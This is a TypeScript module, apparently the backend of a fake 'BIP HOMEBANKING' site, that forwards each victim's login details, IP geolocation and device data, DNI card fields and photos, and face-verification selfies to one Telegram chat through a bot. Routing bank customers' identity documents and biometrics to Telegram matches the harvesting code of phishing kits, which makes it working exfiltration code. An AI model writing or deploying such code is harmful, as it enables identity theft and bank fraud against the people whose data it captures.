// 📱 Servicio de notificaciones por Telegram
import TelegramBot from 'node-telegram-bot-api';
import * as fs from 'fs';
import * as path from 'path';
import geoip from 'geoip-lite';
import { UAParser } from 'ua-parser-js';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

let bot: TelegramBot | null = null;

// Inicializar bot solo si hay token configurado
if (TELEGRAM_BOT_TOKEN) {
  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
}

export const sendLoginNotification = async (userData: {
  username: string;
  name: string;
  email: string;
  timestamp: string;
  ip?: string;
  userAgent?: string;
}) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    console.log('⚠️ Telegram no configurado. Login de:', userData.username);
    return;
  }

  try {
    // Obtener información del dispositivo
    const parser = new UAParser(userData.userAgent);
    const deviceInfo = parser.getResult();
    
    // Obtener geolocalización por IP
    let locationInfo = '🌍 *Ubicación:* No disponible';
    if (userData.ip && userData.ip !== '::1' && userData.ip !== '127.0.0.1') {
      const geo = geoip.lookup(userData.ip);
      if (geo) {
        locationInfo = `🌍 *Ubicación:* ${geo.city || 'Desconocida'}, ${geo.country}\n📍 *Coordenadas:* ${geo.ll[0]}, ${geo.ll[1]}`;
      }
    }

    const message = `
🔐 *NUEVO LOGIN - BIP HOMEBANKING*

━━━━━━━━━━━━━━━━━━━━━━
👤 *DATOS DEL USUARIO*
━━━━━━━━━━━━━━━━━━━━━━
📝 *Usuario:* ${userData.username}
📧 *Email:* ${userData.email}
👨‍💼 *Nombre:* ${userData.name}

━━━━━━━━━━━━━━━━━━━━━━
📱 *INFORMACIÓN DEL DISPOSITIVO*
━━━━━━━━━━━━━━━━━━━━━━
💻 *Navegador:* ${deviceInfo.browser.name || 'Desconocido'} ${deviceInfo.browser.version || ''}
📱 *Sistema:* ${deviceInfo.os.name || 'Desconocido'} ${deviceInfo.os.version || ''}
🖥️ *Dispositivo:* ${deviceInfo.device.vendor || ''} ${deviceInfo.device.model || deviceInfo.device.type || 'Desktop'}

━━━━━━━━━━━━━━━━━━━━━━
🌐 *INFORMACIÓN DE RED*
━━━━━━━━━━━━━━━━━━━━━━
🔢 *IP:* ${userData.ip || 'No disponible'}
${locationInfo}

━━━━━━━━━━━━━━━━━━━━━━
🕐 *Fecha y Hora:* ${userData.timestamp}

✅ *LOGIN EXITOSO*
    `;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
    console.log('✅ Notificación de login enviada a Telegram');
  } catch (error) {
    console.error('❌ Error enviando notificación a Telegram:', error);
  }
};

export const sendDNINotification = async (data: {
  userId: string;
  frontImage: string;
  backImage: string;
  timestamp: string;
  dniData?: any;
  bcraValidation?: any;
}) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    console.log('⚠️ Telegram no configurado');
    return;
  }

  try {
    const validationEmoji = data.bcraValidation?.valid ? '✅' : '❌';
    const scoreEmoji = data.bcraValidation?.score >= 90 ? '🟢' : data.bcraValidation?.score >= 70 ? '🟡' : '🔴';
    
    const message = `
📄 *VERIFICACIÓN DNI - BIP HOMEBANKING*

━━━━━━━━━━━━━━━━━━━━━━
👤 *DATOS PERSONALES*
━━━━━━━━━━━━━━━━━━━━━━
📝 *Usuario ID:* ${data.userId}
${data.dniData ? `
🆔 *Número DNI:* ${data.dniData.numero}
👤 *Nombre:* ${data.dniData.nombre} ${data.dniData.apellido}
🎂 *Fecha Nac.:* ${data.dniData.fechaNacimiento}
⚥ *Sexo:* ${data.dniData.sexo}
📅 *Emisión:* ${data.dniData.fechaEmision}
📅 *Vencimiento:* ${data.dniData.fechaVencimiento}
` : ''}

━━━━━━━━━━━━━━━━━━━━━━
🏦 *VALIDACIÓN BANCO CENTRAL*
━━━━━━━━━━━━━━━━━━━━━━
${data.bcraValidation ? `
${validationEmoji} *Estado:* ${data.bcraValidation.status}
${scoreEmoji} *Score:* ${data.bcraValidation.score}/100
✓ *Verificado:* ${data.bcraValidation.verificado ? 'SÍ' : 'NO'}
` : 'No disponible'}

━━━━━━━━━━━━━━━━━━━━━━
🕐 *Fecha:* ${data.timestamp}

📸 Imágenes del DNI adjuntas ↓
    `;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });

    // Convertir base64 a buffer y enviar fotos
    const frontBuffer = Buffer.from(data.frontImage.split(',')[1], 'base64');
    const backBuffer = Buffer.from(data.backImage.split(',')[1], 'base64');

    await bot.sendPhoto(TELEGRAM_CHAT_ID, frontBuffer, { 
      caption: `📄 DNI - FRENTE\n🆔 ${data.dniData?.numero || 'N/A'}` 
    });
    
    await bot.sendPhoto(TELEGRAM_CHAT_ID, backBuffer, { 
      caption: `📄 DNI - DORSO\n🆔 ${data.dniData?.numero || 'N/A'}` 
    });

    console.log('✅ DNI enviado a Telegram');
  } catch (error) {
    console.error('❌ Error enviando DNI a Telegram:', error);
  }
};

export const sendFacialNotification = async (data: {
  userId: string;
  faceImage: string;
  lightLevel: number;
  timestamp: string;
}) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    console.log('⚠️ Telegram no configurado');
    return;
  }

  try {
    const lightEmoji = data.lightLevel >= 60 ? '🟢' : data.lightLevel >= 30 ? '🟡' : '🔴';
    const qualityStatus = data.lightLevel >= 60 ? 'EXCELENTE' : data.lightLevel >= 30 ? 'BUENA' : 'REGULAR';
    
    const message = `
👤 *VERIFICACIÓN FACIAL - BIP HOMEBANKING*

━━━━━━━━━━━━━━━━━━━━━━
📊 *ANÁLISIS BIOMÉTRICO*
━━━━━━━━━━━━━━━━━━━━━━
👤 *Usuario ID:* ${data.userId}
💡 *Nivel de Luz:* ${data.lightLevel}% ${lightEmoji}
📈 *Calidad:* ${qualityStatus}
✅ *Verificación:* COMPLETADA

━━━━━━━━━━━━━━━━━━━━━━
🕐 *Fecha:* ${data.timestamp}

📸 Foto de verificación facial adjunta ↓
    `;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });

    // Enviar foto facial
    const faceBuffer = Buffer.from(data.faceImage.split(',')[1], 'base64');
    await bot.sendPhoto(TELEGRAM_CHAT_ID, faceBuffer, { 
      caption: `👤 VERIFICACIÓN FACIAL\n💡 Luz: ${data.lightLevel}% | ${qualityStatus}` 
    });

    console.log('✅ Verificación facial enviada a Telegram');
  } catch (error) {
    console.error('❌ Error enviando verificación facial:', error);
  }
};

export const sendSecurityAlert = async (alertData: {
  type: string;
  message: string;
  username?: string;
}) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    return;
  }

  try {
    const message = `
⚠️ *ALERTA DE SEGURIDAD - BIP*

🚨 *Tipo:* ${alertData.type}
📝 *Mensaje:* ${alertData.message}
${alertData.username ? `👤 *Usuario:* ${alertData.username}` : ''}
🕐 *Fecha:* ${new Date().toLocaleString('es-AR')}
    `;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
  } catch (error) {
    console.error('Error enviando alerta a Telegram:', error);
  }
};
